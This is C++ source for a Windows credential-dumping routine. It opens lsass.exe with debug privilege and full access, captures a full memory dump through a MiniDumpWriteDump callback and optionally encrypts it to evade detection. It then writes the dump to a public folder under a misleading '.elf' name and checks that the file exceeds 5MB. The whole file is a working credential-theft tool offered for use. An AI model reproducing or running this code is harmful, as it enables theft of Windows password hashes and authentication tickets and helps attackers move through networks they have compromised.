#define _CRT_SECURE_NO_WARNINGS // Suppress security warnings

#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include "DebugHelper.h"

#pragma comment (lib, "Dbghelp.lib")
using namespace std;



bool callbacksMDWD(bool encrypt = false)
{
	int returnCode;
	HANDLE dumpFile = NULL;
	DWORD bytesWritten = 0;
	DWORD Pid = getPID();
	if (Pid == 0)
	{
		printf("Could not find lsass.exe PID \n");
		return false;
	}

	std::cout << "Lsass PID: " << Pid << std::endl;

	EnableDebugPrivilege();
	HANDLE victimHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);
	if (victimHandle == nullptr)
	{

		printf("Could not open a handle to lsass.exe \n");
		return false;
	}

	printf("Got a handle to lsass.exe succesfuly \n");

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;


	if (MiniDumpWriteDump(victimHandle, Pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo) == FALSE)
	{
		printf("Failed to create a dump of the forked process.\n");
		return false;

	}

	printf("Successfully created dump of lsass process.\n");

	if (encrypt) {
		// Encryption logic here
		std::cout << "Encrypting the dump data before writing on disk.\n";
		Encrypt(dBuff, bReadd);
	}
	else {
		std::cout << "Proceeding without encryption..." << std::endl;
	}
	

	std::string dumpFileName = "C:\\Users\\Public\\callback.elf";

	dumpFile = CreateFileA(dumpFileName.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (dumpFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create dump file.\n");
		return false;
	}

	printf("Successfully initialized dump file \n");

	if (WriteFile(dumpFile, dBuff, bReadd, &bytesWritten, NULL))
	{
		returnCode = TRUE;

		Sleep(5000);

		printf("Checking if file exists and greater than 5MBs \n");

		WIN32_FILE_ATTRIBUTE_DATA fileInfo;
		if (GetFileAttributesExA(dumpFileName.c_str(), GetFileExInfoStandard, &fileInfo) == 0)
		{
			printf("Failed to get file attributes.");
			return false;
		}


		if (fileInfo.nFileSizeHigh == 0 && fileInfo.nFileSizeLow < 1024 * 1024 * 5)
		{
			printf("File size is less than 5MBs.\n");
			return false;
		}

		printf("File exists and size is greater than 5MBs.\n");
	}
	else
	{
		printf("Failed to write dump to disk \n");
		return false;
	}

	return true;
}